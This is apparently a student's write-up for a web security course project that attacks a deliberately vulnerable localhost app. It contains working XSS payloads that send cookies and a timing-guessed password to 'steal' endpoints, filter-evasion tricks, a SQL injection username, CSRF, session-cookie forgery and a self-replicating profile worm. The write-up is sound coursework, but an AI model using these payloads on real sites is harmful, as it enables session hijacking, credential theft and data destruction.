# COMP 4634 - Project 2, Part 1

> by Aleksandr Sergeev, student id `21158862`.

Read this file as markdown for the best expirience :)

## Exploit Alpha: Cookie Theft

The basic idea is inserting the following script into the page HTML:

```html
<script>
    Array.from(document.getElementsByClassName("error")).forEach(e => {e.hidden = true;});
    fetch(`./steal_cookie?cookie=${document.cookie}`);
    window.history.replaceState(null, "", "./profile");
</script>
```

The script should be inserted right after `http://localhost:3000/profile?username=` into the URL.
Since username does not (surprisingly!) match any existing name, an error box is shown.
The script hides the box (all the HTML elements with "error" class attribute), now the page resembles normal current user profile page.
Then an HTTP GET request is performed to the `steal_cookie` endpoint, including all the user cookies.
Finally, the browser location bar entry is changed to `profile` endpoint (without leaving any trace in history), so that the attack is no longer visible.
The only way to detect the attack is inspecting now hidden `error` paragraph contents via developer tools.

This link should be used as a replacement for the user profile endpoint link.

### Documentation used

1. Element [searching](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCollection) and [hiding](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/hidden) docs.
2. Fetch API [specification](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) for performing GET request.
3. Stackoverflow [discussion](https://stackoverflow.com/questions/3338642/updating-address-bar-with-new-url-without-hash-or-reloading-the-page) and history API [reference](https://developer.mozilla.org/en-US/docs/Web/API/History_API) for changing address line without reloading page.

## Exploit Bravo: Cross-Site Request Forgery

The general idea of my solution was inspired partially by [this website](https://owasp.org/www-community/attacks/csrf).
I thought that the easiest way to reproduce something is repeating as many steps of the original solution as possible, so I decided to not bother with creating HTTP `PUSH` requests myself and use the same forms as the original website.

Another consideration is that the website is going to be deployed on the same **host** as the original website, and only the port number will be different.
That means that the session cookie (valid for `localhost` and path `/`) will be also valid for my malicious website.

In order not to hardcode the host name, the `action` field of the form is reset, the `target` value of the form is redirected to an `iframe` element (so that when the form is submitted, the whole webpage won't be reloaded).
Then a callback is set so that once the `iframe` is loaded (meaning the form was submitted and result was received), user is redirected to the course website and the malicious website is erased from browser history.

### Documentation used

1. HTML form [action](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/form#action) docs.
2. HTML form [target](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/form#target) redirection description.
3. HTML form [reloading](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/load_event) on submission.

## Exploit Charlie: Session Hijacking with Cookies

Honestly, until now I was always thinking that the cookies that are **not** meant for user reading or writing are encrypted by server.
However, as I learned from the [`cookie-session` js package documentation](https://www.npmjs.com/package/cookie-session#cookie-session), the session cookies produced by this package are not encrypted but only encoded with `base64`.

The `bitbar` server authenticates a user using username stored in session, not checking any other cookie information (everywhere in `code/router.js` file).
That means that the only thing my script has to do is extract the session object from session cookie, change the username and encrypt it back.
After that the server will treat the current user as the other the changed username belongs to.

### Documentation used

1. JavaScript methods for [decoding](https://developer.mozilla.org/en-US/docs/Web/API/Window/atob) and [encoding](https://developer.mozilla.org/en-US/docs/Web/API/Window/btoa) object to `base64`.

## Exploit Delta: Cooking the Books with Cookies

This exploit is very much similar to the previous one.
The only difference is that instead of the username, bitbar count is changed in the session cookie.

In the `code/router.js` file, lines 153-192, the sender bitbar number is not fetched from the database, but taken directly from session cookie before writing (lines 174-176).
If directly before making a 1 bitbar transaction to come user, we set the current user bitbar number to `10^6 + 1`, the balance after transaction will be exactly one million.

### Documentation used

No documentation was used for this step :/

## Exploit Echo: SQL Injection

The idea of SQL injection is abusing the fact that sometimes unverified and poorly ecranised user data is inserted into raw SQL queries.
The `bitbar` server often does that (every time when values are inserted into SQL queries using template strings and `${ ... }` values), so the queries can be modified by end users easily.

My first idea was just inserting a secong query, separated by `;`, but then I realized that apparently only the first query would be executed in that case.
In the end I came up with a simpler solution: naming a user `destroy" OR username == "user3` will only insert user named `destroy` upon insertion (`OR ...` part will be ignored), however upon deleting this user, the `user3` will also be deleted.

### Documentation used

No documentation was used for this step as well :/

## Exploit Foxtrot: Profile Worm

This one was a little tricky.
Once again, as in exploit bravo, I decided to use forms instead of push queries (otherwise I would have to set up headers like `Content-Type` and encode data for all my `PUSH` queries).
So the 1 `bitbar` transaction query is done exactly like in exploit bravo.
The profile update query is also done similarly, however the payload (this very script) is calculated in runtime (as some kind of quine) - the whole script is wrapped into a div block, and its `outerHTML` value is being used.

I have also added changing current user profile in the current session already (last 4 lines of my sscript), similarly to exploits charlie and delta.
The only visible element of my solution is a totally unsuspicious paragraph, that would be displayed in the profile instead of the whole worm text.

For changing profile `bitbar` count to 10, I have addeda copy of a span with `bitbar_count` ID and a hardcoded value of 10 in my solution **before** the span with similar ID in the bitbar count visualization block (file `code/views/pages/profile/view.ejs`, line 25).
According to my experience and [this StackOverflow answer](https://stackoverflow.com/a/48240315/9124072) in case of duplicated IDs, the **first** element with the specified ID will be returned.

### Documentation used

1. HTML element `outerHTML` [property](https://developer.mozilla.org/en-US/docs/Web/API/Element/outerHTML) documentation.
2. Honestly, I knew that about IDs myself, but let [this](https://www.quora.com/What-is-the-impact-of-having-a-duplicate-ID-in-HTML-CSS) be my reference, I guess...

## Exploit Gamma: Password Extraction via Timing Attack

Maybe I didn't understand this task correctly (but since it works, I assume I did).
I thought I will have to exploit the string comparison side-channel attack (similar to what can be used to guess stack canaries in runtime), something like the topic described [here](https://stackoverflow.com/a/31096242/9124072).
But in reality the whole thing appeared to be easier.
On the line 52 of the `code/router.js` file, a 2 seconds timeout is added (it represents some time-consuming login DB requests or something similar), so obviously successful login attempt will take more time than an unsuccessful one.

That fact was used in the script I came up with, it was based on the `code/gamma_starter.html` template.
This time, however, it wasn't as easy as plain HTML script insertion.
Not only the code should not contain any `"` characters (because they will break JSON POST request body structure), but also all the `script`, `SCRIPT`, `img` and `IMG` values are removed from it before rendering.
The first issue can be solved by using single ticks and back ticks, and for the second I just came up with some random HTML tag names like `sCrIpT` and `ImG` (which is fine because HTML is not case-sensitive).
The whole thing is also hidden by `hidden` HTML attribute.

In general, the code implementation is not that hard: for every possible password value in the list of candidates the login page is being queried (by resetting of img tag `src` field).
Upon error (that will happen unconditionally, because login page is NOT and image), the time taken by the server torespond is recorded.
Finally, the largest time (that obviously should be greater than 2 seconds timeout) is being found and corresponding password is being sent to the `steal_password` endpoint using plain JavaScript fetch.

Here's the nicely-formatted HTML of my answer:

```html
<span hidden>
    <ImG id='test'/>
    <sCrIpT>
        const dictionary = [`password`, `123456`, `	12345678`, `dragon`, `1234`, `qwerty`, `12345`];
        let deltas = Array(dictionary.length);
        let index = 0;
        const test = document.getElementById(`test`);
        test.onerror = () => {
            const end = new Date();
            deltas[index - 1] = end - start;
            start = new Date();
            if (index < dictionary.length) {
                test.src = `http://${document.location.hostname}:3000/get_login?username=userx&password=${dictionary[index]}`;
            } else {
                const imax = deltas.reduce((m, x, i, arr) => m == -1 || x > arr[m] ? i : m, -1);
                const dsum = deltas.reduce((s, c, i, arr) => s + c, 0);
                fetch(`./steal_password?password=${dictionary[imax]}&timeElapsed=${dsum}`);
            }
            index += 1;
        };
        let start = new Date();
        test.src = `http://${document.location.hostname}:3000/get_login?username=userx&password=${dictionary[0]}`;
        index += 1;
    </sCrIpT>
</span>
```

The correct password found is `dragon`.

### Documentation used

Well, that's it, I really only used the `code/gamma_starter.html` file...
